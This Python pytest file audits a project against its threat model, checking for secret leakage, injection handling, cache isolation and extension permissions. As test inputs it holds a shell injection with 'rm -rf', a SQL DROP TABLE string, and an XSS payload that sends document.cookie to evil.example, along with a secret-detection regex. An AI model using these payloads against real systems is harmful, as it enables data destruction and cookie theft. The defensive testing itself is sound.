"""Comprehensive 9-threat security audit verifying docs/security/threat-model.md."""

from __future__ import annotations

import json
import re
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from project_t_cloud_services import CloudConfig, create_control_plane_app
from project_t_contracts import OptimizationMode, OptimizationRequestWire
from project_t_local_runtime import LocalRuntimeService, RuntimeConfig, create_app
from project_t_local_runtime.auth import redact_sensitive_text
from project_t_optimization_core import (
    ContextDocument,
    ContextFingerprintStore,
    ContextSelector,
    PipelineOrchestrator,
)

ROOT = Path(__file__).resolve().parents[2]
SECRET_LEAK_RE = re.compile(r"(sk-proj-[A-Za-z0-9_-]{10,}|sk-ant-[A-Za-z0-9_-]{10,}|AIza[A-Za-z0-9_-]{16,})")


def test_threat_1_zero_secrets_in_built_frontend_bundles_and_logs() -> None:
    """Threat 1 (API key leakage): no secrets or cookie scraping in built JS/HTML bundles."""
    dist_dirs = [
        ROOT / "apps" / "browser-extension" / "dist",
        ROOT / "apps" / "dashboard" / "dist",
        ROOT / "apps" / "vscode-extension" / "dist",
        ROOT / "apps" / "mcp-server" / "dist",
    ]
    checked_files = 0
    for dist_dir in dist_dirs:
        if not dist_dir.exists():
            continue
        for artifact in dist_dir.rglob("*"):
            if not artifact.is_file() or artifact.suffix not in {".js", ".html"}:
                continue
            checked_files += 1
            text = artifact.read_text(encoding="utf-8", errors="ignore")
            assert not SECRET_LEAK_RE.search(text), f"Secret pattern found in {artifact}"
            assert "document.cookie" not in text, f"Cookie access found in {artifact}"

    assert checked_files > 0
    redacted = redact_sensitive_text("Authorization: Bearer tok_1234567890 key=sk-secretkey99999999")
    assert "tok_1234567890" not in redacted
    assert "sk-secretkey99999999" not in redacted


def test_threat_2_malicious_prompt_and_sql_injection_treated_strictly_as_data(tmp_path: Path) -> None:
    """Threat 2 (Malicious prompt content): injection payloads never alter SQLite or execute commands."""
    marker_file = tmp_path / "must_exist.txt"
    marker_file.write_text("intact\n", encoding="utf-8")

    malicious_payloads = [
        f"Fix error; rm -rf {marker_file}; $(touch {tmp_path / 'pwned'})",
        "Check query: '; DROP TABLE optimization_runs; -- Never remove `idempotency_key`.",
        "<script>fetch('https://evil.example/?c=' + document.cookie)</script>",
    ]

    orch = PipelineOrchestrator()
    for text in malicious_payloads:
        res = orch.optimize(
            OptimizationRequestWire(
                content=text,
                provider="openai",
                model="gpt-4o",
                mode=OptimizationMode.BALANCED,
            )
        )
        assert isinstance(res.result.optimized_content, str)
    assert marker_file.exists()
    assert not (tmp_path / "pwned").exists()

    cloud_app = create_control_plane_app(
        CloudConfig(data_dir=tmp_path / "cloud", database_url=f"sqlite:///{tmp_path / 'cloud.db'}")
    )
    with TestClient(cloud_app) as client:
        reg = client.post(
            "/api/cloud/v1/auth/register",
            json={
                "email": "inj'; DROP TABLE users;--@example.com",
                "display_name": "Injection Test",
                "password": "safe-password-123",
            },
        )
        assert reg.status_code == 201
        assert client.get("/health").json()["db_ready"] is True


def test_threat_5_and_9_cache_isolation_and_stale_memory_invalidation(tmp_path: Path) -> None:
    """Threats 5 & 9: fingerprints isolate strictly by project_id + content_version + file_hash & TTL."""
    store = ContextFingerprintStore()
    store.put(
        project_id="proj_alpha",
        content_version="v1",
        file_hash="sha_a1",
        block_text="def alpha_secret(): return 42",
        token_count=12,
        accuracy="exact",
        ttl_seconds=300,
    )

    # Same block/file_hash under another project or content version must never leak
    assert (
        store.lookup(
            project_id="proj_beta",
            content_version="v1",
            file_hash="sha_a1",
            block_text="def alpha_secret(): return 42",
        )
        is None
    )
    assert (
        store.lookup(
            project_id="proj_alpha",
            content_version="v2",
            file_hash="sha_a1",
            block_text="def alpha_secret(): return 42",
        )
        is None
    )
    # File edit changing file_hash immediately invalidates stale entry
    assert (
        store.lookup(
            project_id="proj_alpha",
            content_version="v1",
            file_hash="sha_a2_edited",
            block_text="def alpha_secret(): return 42",
        )
        is None
    )
    assert (
        store.lookup(
            project_id="proj_alpha",
            content_version="v1",
            file_hash="sha_a1",
            block_text="def alpha_secret(): return 42",
        )
        is not None
    )

    # Expired TTL entry returns None
    store.put(
        project_id="proj_alpha",
        content_version="v1",
        file_hash="sha_expired",
        block_text="stale chunk",
        token_count=4,
        ttl_seconds=-10,
    )
    assert (
        store.lookup(
            project_id="proj_alpha",
            content_version="v1",
            file_hash="sha_expired",
            block_text="stale chunk",
        )
        is None
    )

    assert store.invalidate_project_file(project_id="proj_alpha", file_hash="sha_a1") == 1


def test_threat_7_context_selector_provenance_and_workspace_confinement(tmp_path: Path) -> None:
    """Threat 7 (Context poisoning): selector records provenance strictly inside approved workspace."""
    ws_a = tmp_path / "ws_a"
    ws_b = tmp_path / "ws_b"
    ws_a.mkdir()
    ws_b.mkdir()
    (ws_a / "secret_a.py").write_text("SECRET_TOKEN = 'alpha'\n", encoding="utf-8")
    (ws_b / "auth.py").write_text("def verifyJwtToken(token: str) -> bool:\n    return bool(token)\n", encoding="utf-8")

    selector = ContextSelector()
    docs = [
        ContextDocument(relative_path="auth.py", content=(ws_b / "auth.py").read_text(encoding="utf-8"), file_hash="h1")
    ]
    selected = selector.select(task_description="Fix verifyJwtToken validation", documents=docs)
    assert [f.relative_path for f in selected.selected_files] == ["auth.py"]
    assert selected.selected_files[0].reason

    svc = LocalRuntimeService(
        config=RuntimeConfig(
            data_dir=tmp_path / "rt",
            use_os_keyring=False,
            approved_workspaces=(ws_b,),
        )
    )
    try:
        from project_t_contracts import ContextSelectRequest

        ctx_res = svc.select_context(
            ContextSelectRequest(task_description="Fix verifyJwtToken", workspace_root=str(ws_b))
        )
        paths = [item.relative_path for item in ctx_res.selected_files]
        assert "auth.py" in paths
        assert "secret_a.py" not in paths
    finally:
        svc.close()


def test_threat_8_browser_extension_manifest_v3_minimal_scope() -> None:
    """Threat 8 (Browser data exposure): Manifest V3 restricts host permissions to AI UIs & loopback."""
    manifest = json.loads(
        (ROOT / "apps" / "browser-extension" / "manifest.json").read_text(encoding="utf-8")
    )
    assert manifest["manifest_version"] == 3
    assert set(manifest["permissions"]) == {"storage", "activeTab"}
    forbidden = {"<all_urls>", "cookies", "tabs", "history", "webRequest", "debugger"}
    assert not (set(manifest["permissions"]) & forbidden)
    assert not (set(manifest["host_permissions"]) & forbidden)
    assert all(
        host.startswith(("https://chatgpt.com/", "https://chat.openai.com/", "https://claude.ai/", "https://gemini.google.com/", "http://127.0.0.1:4765/", "http://localhost:4765/"))
        for host in manifest["host_permissions"]
    )
